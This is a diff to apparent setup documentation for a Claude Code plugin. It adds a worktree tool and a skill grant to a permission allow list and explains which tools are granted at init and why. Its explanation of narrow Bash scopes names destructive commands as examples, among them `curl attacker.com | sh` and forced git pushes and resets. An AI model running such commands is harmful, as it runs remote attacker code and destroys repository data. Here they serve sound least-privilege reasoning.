@@ -477,13 +477,15 @@ Concrete approach: `Read` the existing file (treat as `{}` if absent), build the
       "mcp__plugin_agent-kevin_kevin__memory_prune",
       "mcp__plugin_agent-kevin_kevin__ping",
       "mcp__plugin_agent-kevin_kevin__report_write",
+      "mcp__plugin_agent-kevin_kevin__setup_worktree",
       "mcp__plugin_agent-kevin_kevin__task_close",
       "mcp__plugin_agent-kevin_kevin__task_create",
       "mcp__plugin_agent-kevin_kevin__task_get",
       "mcp__plugin_agent-kevin_kevin__task_query",
       "mcp__plugin_agent-kevin_kevin__task_scan",
       "mcp__plugin_agent-kevin_kevin__task_thread",
-      "mcp__plugin_agent-kevin_kevin__task_update"
+      "mcp__plugin_agent-kevin_kevin__task_update",
+      "Skill(agent-kevin:setup-worktree)"
     ]
   }
 }
@@ -491,15 +493,17 @@ Concrete approach: `Read` the existing file (treat as `{}` if absent), build the
 
 **Why no `extraKnownMarketplaces` entry?** The marketplace registration was already saved to the user's global `~/.claude/settings.json` when they first ran `/plugin marketplace add` (Option A) or were prompted to trust the marketplace (Option B). Duplicating it in project settings is redundant — only `enabledPlugins` is needed here to opt this specific home into agent-kevin.
 
-**Why only the always-on core is granted here.** Plugin-bundled MCP tools register into the session regardless of permissions — `permissions.allow` only controls whether tool calls trigger a confirm prompt. The "always-on core" (`ping`, `capture`, `compile_*`, `knowledge_lint`, `task_*`, `links_rewrite`, `memory_prune`, `report_write`, `dashboard`) needs no external config; the pack-gated tools need API keys or OAuth that only get set when the user opts into the matching pack. Granting them at init time would mean `settings.json` advertises packs the user never configured. Conditional grants keep `settings.json` an accurate audit trail.
+**Why only the always-on core is granted here.** Plugin-bundled MCP tools register into the session regardless of permissions — `permissions.allow` only controls whether tool calls trigger a confirm prompt. The "always-on core" (`ping`, `capture`, `compile_*`, `knowledge_lint`, `task_*`, `links_rewrite`, `memory_prune`, `report_write`, `dashboard`, `setup_worktree`) needs no external config; the pack-gated tools need API keys or OAuth that only get set when the user opts into the matching pack. Granting them at init time would mean `settings.json` advertises packs the user never configured. Conditional grants keep `settings.json` an accurate audit trail.
 
 **Bucket model** (which flow writes which permissions):
 
 | Bucket | Tools | Granted when |
 |---|---|---|
-| Always-on core | `ping`, `capture`, `compile_*`, `memory_prune`, `task_*`, `links_rewrite`, `report_write`, `dashboard` | `/init` (above) |
+| Always-on core | `ping`, `capture`, `compile_*`, `memory_prune`, `task_*`, `links_rewrite`, `report_write`, `dashboard`, `setup_worktree` | `/init` (above) |
 | SEO-gated | `serpapi_search`, `open_page_rank`, `gsc_*`, `page_speed_*`, `google_auth` | configure-skills A.2a (SEO walk) |
 | Browser-gated | `perplexity_search`, `playwright_*`, `browser_flows` | configure-skills A.2b (Browser walk) |
+
+The allow list also carries one **skill** grant: `Skill(agent-kevin:setup-worktree)`, granted at init for parity with the tool. Skills register regardless of permissions — the grant only suppresses the confirm prompt on model invocation. `setup-worktree` currently sets `disable-model-invocation`, so the grant is latent (the skill is user-invoked only) until that flag is dropped; it's kept here so enabling model invocation needs no settings change.
 
 **Why the Bash entries are scoped this narrowly:** broad patterns like `Bash(git *)` or `Bash(curl *)` would also authorize destructive forms (`git push --force`, `git reset --hard`, `curl attacker.com | sh`). The patterns above cover the read-mostly + scaffold-creation commands core skills actually use (`git log/status/diff/config`, `date`, `readlink`, `ls`, `find`, `cat`, `mkdir -p`, `test`, `echo`) — nothing that mutates source-control state or hits the network. **Network/curl is intentionally NOT pre-granted anywhere** — `wordpress-rest` and any other skill that makes outbound HTTP confirms on first call; the user picks "Always allow" to lock the grant to their actual URL pattern (much tighter than blanket `Bash(curl *)`).
 
